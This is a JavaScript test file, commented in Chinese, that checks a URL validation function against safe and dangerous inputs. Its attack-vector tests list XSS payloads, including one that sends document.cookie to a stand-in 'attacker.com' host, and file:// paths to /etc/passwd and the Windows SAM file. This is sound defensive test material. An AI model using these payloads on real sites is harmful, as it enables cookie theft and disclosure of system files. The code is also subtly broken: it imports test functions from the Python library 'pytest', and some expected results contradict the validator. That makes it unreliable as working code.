/**
 * URL安全验证测试
 * 测试新的URL验证函数是否能正确识别和过滤恶意URL
 */

import { describe, it, expect } from 'pytest';

// 模拟组件类，用于测试URL验证方法
class MockComponent {
    isValidUrl(url) {
        try {
            const urlObj = new URL(url);
            
            // 只允许http和https协议
            if (urlObj.protocol !== 'http:' && urlObj.protocol !== 'https:') {
                return false;
            }
            
            // 检查域名是否包含危险字符
            const hostname = urlObj.hostname;
            if (!hostname || /[<>\"'&]/.test(hostname)) {
                return false;
            }
            
            // 检查端口号是否在安全范围内
            if (urlObj.port) {
                const port = parseInt(urlObj.port);
                if (port < 1 || port > 65535) {
                    return false;
                }
            }
            
            // 检查URL长度是否合理
            if (url.length > 2048) {
                return false;
            }
            
            // 检查是否包含可疑的JavaScript代码
            if (/javascript:|data:|vbscript:|file:/i.test(url)) {
                return false;
            }
            
            return true;
        } catch (error) {
            return false;
        }
    }
}

describe('URL安全验证测试', () => {
    let component;

    beforeEach(() => {
        component = new MockComponent();
    });

    describe('安全的URL应该通过验证', () => {
        it('应该允许标准的HTTP URL', () => {
            const urls = [
                'http://example.com',
                'http://www.example.com',
                'http://example.com/path',
                'http://example.com/path?param=value',
                'http://example.com:8080/path'
            ];

            urls.forEach(url => {
                expect(component.isValidUrl(url)).toBe(true);
            });
        });

        it('应该允许标准的HTTPS URL', () => {
            const urls = [
                'https://example.com',
                'https://www.example.com',
                'https://example.com/path',
                'https://example.com/path?param=value',
                'https://example.com:443/path'
            ];

            urls.forEach(url => {
                expect(component.isValidUrl(url)).toBe(true);
            });
        });

        it('应该允许包含查询参数和片段的URL', () => {
            const urls = [
                'https://example.com/path?param=value&other=123',
                'https://example.com/path#section',
                'https://example.com/path?param=value#section'
            ];

            urls.forEach(url => {
                expect(component.isValidUrl(url)).toBe(true);
            });
        });

        it('应该允许包含特殊字符的URL', () => {
            const urls = [
                'https://example.com/path with spaces',
                'https://example.com/path-with-dashes',
                'https://example.com/path_with_underscores',
                'https://example.com/path%20with%20encoding'
            ];

            urls.forEach(url => {
                expect(component.isValidUrl(url)).toBe(true);
            });
        });
    });

    describe('危险的URL应该被拒绝', () => {
        it('应该拒绝非HTTP/HTTPS协议', () => {
            const dangerousUrls = [
                'javascript:alert("xss")',
                'data:text/html,<script>alert("xss")</script>',
                'vbscript:msgbox("xss")',
                'file:///etc/passwd',
                'ftp://example.com',
                'mailto:test@example.com',
                'tel:+1234567890'
            ];

            dangerousUrls.forEach(url => {
                expect(component.isValidUrl(url)).toBe(false);
            });
        });

        it('应该拒绝包含危险字符的域名', () => {
            const dangerousUrls = [
                'http://example<.com',
                'http://example>.com',
                'http://example".com',
                'http://example\'.com',
                'http://example&.com'
            ];

            dangerousUrls.forEach(url => {
                expect(component.isValidUrl(url)).toBe(false);
            });
        });

        it('应该拒绝无效的端口号', () => {
            const dangerousUrls = [
                'http://example.com:0',
                'http://example.com:65536',
                'http://example.com:-1',
                'http://example.com:abc'
            ];

            dangerousUrls.forEach(url => {
                expect(component.isValidUrl(url)).toBe(false);
            });
        });

        it('应该拒绝过长的URL', () => {
            // 创建一个超过2048字符的URL
            const longPath = '/path'.repeat(500); // 2500字符
            const longUrl = `https://example.com${longPath}`;
            
            expect(component.isValidUrl(longUrl)).toBe(false);
        });

        it('应该拒绝无效的URL格式', () => {
            const invalidUrls = [
                'not-a-url',
                'http://',
                'https://',
                'http://example',
                'example.com',
                'www.example.com'
            ];

            invalidUrls.forEach(url => {
                expect(component.isValidUrl(url)).toBe(false);
            });
        });
    });

    describe('边界情况测试', () => {
        it('应该处理空字符串和null值', () => {
            expect(component.isValidUrl('')).toBe(false);
            expect(component.isValidUrl(null)).toBe(false);
            expect(component.isValidUrl(undefined)).toBe(false);
        });

        it('应该处理非字符串类型', () => {
            expect(component.isValidUrl(123)).toBe(false);
            expect(component.isValidUrl({})).toBe(false);
            expect(component.isValidUrl([])).toBe(false);
        });

        it('应该允许标准端口号', () => {
            expect(component.isValidUrl('http://example.com:80')).toBe(true);
            expect(component.isValidUrl('https://example.com:443')).toBe(true);
            expect(component.isValidUrl('http://example.com:8080')).toBe(true);
        });

        it('应该允许IP地址', () => {
            expect(component.isValidUrl('http://192.168.1.1')).toBe(true);
            expect(component.isValidUrl('https://127.0.0.1')).toBe(true);
            expect(component.isValidUrl('http://[::1]')).toBe(true); // IPv6
        });
    });

    describe('实际攻击向量测试', () => {
        it('应该拒绝XSS攻击向量', () => {
            const xssUrls = [
                'javascript:alert(document.cookie)',
                'javascript:eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))',
                'javascript:fetch("http://attacker.com?cookie="+document.cookie)',
                'data:text/html,<script>alert("xss")</script>',
                'data:application/javascript,alert("xss")'
            ];

            xssUrls.forEach(url => {
                expect(component.isValidUrl(url)).toBe(false);
            });
        });

        it('应该拒绝文件访问攻击向量', () => {
            const fileUrls = [
                'file:///etc/passwd',
                'file:///c:/windows/system32/config/sam',
                'file:///proc/version',
                'file:///var/log/auth.log'
            ];

            fileUrls.forEach(url => {
                expect(component.isValidUrl(url)).toBe(false);
            });
        });

        it('应该拒绝协议混淆攻击向量', () => {
            const protocolUrls = [
                'http://example.com@javascript:alert("xss")',
                'http://javascript:alert("xss")@example.com',
                'http://example.com#javascript:alert("xss")',
                'http://example.com?redirect=javascript:alert("xss")'
            ];

            protocolUrls.forEach(url => {
                expect(component.isValidUrl(url)).toBe(false);
            });
        });
    });
});
